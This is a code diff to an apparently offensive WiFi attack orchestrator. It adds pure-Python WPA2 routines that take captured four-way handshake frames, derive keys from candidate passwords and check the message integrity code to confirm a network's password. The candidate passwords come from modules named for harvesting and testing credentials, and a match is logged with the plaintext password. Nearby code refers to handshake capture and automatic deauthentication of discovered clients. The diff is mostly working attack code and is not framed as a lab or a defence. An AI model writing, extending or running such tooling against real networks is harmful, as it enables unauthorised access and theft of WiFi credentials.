@@ -30,6 +30,21 @@ from .handshake import HandshakeCapture
 from .signal_targeting import SignalTargeting
 from .event_bus import get_event_bus, EventType
 
+# WPA2 crypto imports (guarded for optional dependency)
+try:
+    from .wpa2 import (
+        derive_pmk as wpa2_derive_pmk,
+        derive_ptk as wpa2_derive_ptk,
+        verify_eapol_mic as wpa2_verify_eapol_mic,
+        extract_key_hierarchy as wpa2_extract_key_hierarchy,
+        compute_eapol_mic as wpa2_compute_eapol_mic,
+        EAPOLKeyFrame as WPA2EAPOLKeyFrame,
+        CipherSuite as WPA2CipherSuite,
+    )
+    _HAS_WPA2 = True
+except ImportError:
+    _HAS_WPA2 = False
+
 
 class AttackOrchestrator:
     """
@@ -598,6 +613,159 @@ class AttackOrchestrator:
         }, source="orchestrator")
 
         return True
+
+    def verify_credential(self, ssid, password, handshake_frames):
+        """
+        Verify a WiFi credential using pure-Python WPA2 crypto.
+
+        Derives PMK from password/SSID, computes PTK using nonces from
+        captured handshake frames, then verifies the MIC on Msg2.
+
+        Args:
+            ssid: Network SSID
+            password: WiFi password to verify
+            handshake_frames: List of raw EAPOL frame bytes (must include
+                              at least Msg1 and Msg2)
+
+        Returns:
+            True if the credential is valid (MIC matches), False otherwise.
+        """
+        if not _HAS_WPA2:
+            log.warning("WPA2 module not available, cannot verify credential")
+            return False
+
+        if not handshake_frames or len(handshake_frames) < 2:
+            log.warning("Need at least 2 handshake frames (Msg1 + Msg2)")
+            return False
+
+        try:
+            # Parse frames to find Msg1 (has ANonce, ACK set, no MIC)
+            # and Msg2 (has SNonce, MIC set, no ACK)
+            msg1_frame = None
+            msg2_frame = None
+
+            for raw_frame in handshake_frames:
+                parsed = WPA2EAPOLKeyFrame.parse(raw_frame)
+                if parsed is None:
+                    continue
+                if parsed.has_ack and not parsed.has_mic:
+                    msg1_frame = parsed
+                elif parsed.has_mic and not parsed.has_ack and parsed.is_pairwise:
+                    msg2_frame = parsed
+
+            if msg1_frame is None or msg2_frame is None:
+                log.warning("Could not identify Msg1 and Msg2 in handshake frames")
+                return False
+
+            anonce = msg1_frame.nonce
+            snonce = msg2_frame.nonce
+
+            # Derive PMK from password and SSID
+            pmk = wpa2_derive_pmk(password, ssid)
+
+            # We need AP MAC and STA MAC - extract from context
+            # Use target_bssid if available; for STA mac, derive from frame context
+            ap_mac = self._mac_str_to_bytes(self.target_bssid) if self.target_bssid else None
+            if ap_mac is None:
+                log.warning("No AP MAC available for PTK derivation")
+                return False
+
+            # For STA MAC, try to get it from handshake capture
+            sta_mac = None
+            if hasattr(self, 'handshakes') and self.handshakes:
+                # Get client MAC from handshake capture state
+                for client_mac in self.handshakes._handshakes:
+                    if isinstance(client_mac, str):
+                        sta_mac = self._mac_str_to_bytes(client_mac)
+                        break
+
+            if sta_mac is None:
+                log.warning("No STA MAC available for PTK derivation")
+                return False
+
+            # Derive PTK
+            ptk = wpa2_derive_ptk(pmk, ap_mac, sta_mac, anonce, snonce,
+                                  WPA2CipherSuite.CCMP)
+
+            # Extract KCK from PTK
+            keys = wpa2_extract_key_hierarchy(ptk, WPA2CipherSuite.CCMP)
+
+            # Verify MIC on Msg2
+            result = wpa2_verify_eapol_mic(keys.kck, msg2_frame)
+            if result:
+                log.info(f"Credential VERIFIED for SSID '{ssid}' via WPA2 crypto")
+            else:
+                log.debug(f"Credential verification FAILED for SSID '{ssid}'")
+
+            return result
+
+        except Exception as e:
+            log.warning(f"Credential verification error: {e}")
+            return False
+
+    def _verify_handshake_crypto(self, client_mac, bssid, frames):
+        """
+        Verify a captured handshake using crypto if credentials are known.
+
+        Called after a complete handshake is captured. Attempts MIC
+        verification using any known credentials from cred_harvester
+        or previous cred_tester results.
+
+        Args:
+            client_mac: Client MAC address string
+            bssid: BSSID string
+            frames: List of raw EAPOL frame bytes
+        """
+        if not _HAS_WPA2:
+            return
+
+        if not self.target_ssid:
+            return
+
+        # Gather known passwords from credential sources
+        known_passwords = []
+
+        if self.cred_harvester:
+            try:
+                creds = self.cred_harvester.get_credentials()
+                for cred in creds:
+                    if cred.get("password"):
+                        known_passwords.append(cred["password"])
+            except Exception:
+                pass
+
+        if self.cred_tester:
+            try:
+                results = self.cred_tester.get_results()
+                for r in results:
+                    if r.get("success") and r.get("password"):
+                        known_passwords.append(r["password"])
+            except Exception:
+                pass
+
+        if not known_passwords:
+            log.debug("No known credentials to verify handshake against")
+            return
+
+        for password in known_passwords:
+            if self.verify_credential(self.target_ssid, password, frames):
+                log.critical(
+                    f"Handshake crypto verification SUCCESS: "
+                    f"{bssid} client={client_mac} password='{password}'"
+                )
+                return
+
+        log.debug(f"No known credentials matched handshake for {bssid}")
+
+    @staticmethod
+    def _mac_str_to_bytes(mac_str):
+        """Convert MAC address string 'AA:BB:CC:DD:EE:FF' to 6 bytes."""
+        if not mac_str:
+            return None
+        try:
+            return bytes.fromhex(mac_str.replace(":", "").replace("-", ""))
+        except (ValueError, AttributeError):
+            return None
 
     def _background_recon(self):
         """Continue sniffing to discover new clients and auto-add to deauth."""
